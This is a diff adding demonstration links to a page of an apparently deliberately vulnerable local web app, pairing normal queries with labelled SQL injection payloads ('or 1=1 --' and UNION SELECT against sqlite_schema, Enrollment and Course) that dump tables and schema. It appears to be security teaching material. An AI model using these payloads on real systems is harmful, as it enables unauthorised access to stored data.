@@ -19,6 +19,17 @@
 
 <div class="text-center">
     <h4>SQL Injection (SchoolController)</h4>
+    <p><a href="https://localhost:44365/school/Example100_FindByStudentId?studentId=1">Example100_FindByStudentId (normal use)</a></p>
+    <p><a href="https://localhost:44365/school/Example100_FindByStudentId?studentId=1%20%20or%201=1%20--">Example100_FindByStudentId (abuse SQL-injection: dump full table "Students")</a></p>
+
+    <p><a href="https://localhost:44365/school/Example100_FindByStudentLastName?studentLastName=Alexander">Example100_FindByStudentLastName (normal use)</a></p>
+    <p><a href="https://localhost:44365/school/Example100_FindByStudentLastName?studentLastName=Alexander%27%20or%201=1%20--">Example100_FindByStudentLastName (abuse SQL-injection: dump full School-table)</a></p>
+    <p><a href="https://localhost:44365/school/Example100_FindByStudentLastName?studentLastName=bla%27%20union%20select%20rootpage,type,name,sql%20from%20sqlite_schema%20--">Example100_FindByStudentLastName (abuse SQL-injection: dump all tables-names including column-names)</a></p>
+    <p><a href="https://localhost:44365/school/Example100_FindByStudentLastName?studentLastName=bla%27%20union%20select%20EnrollmentID,CourseID,StudentID,Grade%20from%20Enrollment%20--">Example100_FindByStudentLastName (abuse SQL-injection: dump full table "Enrollment")</a></p>
+    <p><a href="https://localhost:44365/school/Example100_FindByStudentLastName?studentLastName=bla%27%20union%20select%20CourseID,Title,Null,Null%20from%20Course%20--">Example100_FindByStudentLastName (abuse SQL-injection: dump full table "Course")</a></p>
+
+    <p><a href="https://localhost:44365/school/Example100_FindByStudentFirstMidName?studentFirstMidName=Carson">Example100_FindByStudentFirstMidName (normal use)</a></p>
+    <p><a href="https://localhost:44365/school/Example100_FindByStudentFirstMidName?studentFirstMidName=Carson%27%20or%201=1%20--">Example100_FindByStudentFirstMidName (abuse SQL-injection: dump full table "Students")</a></p>
 </div>
 
 <div class="text-center">
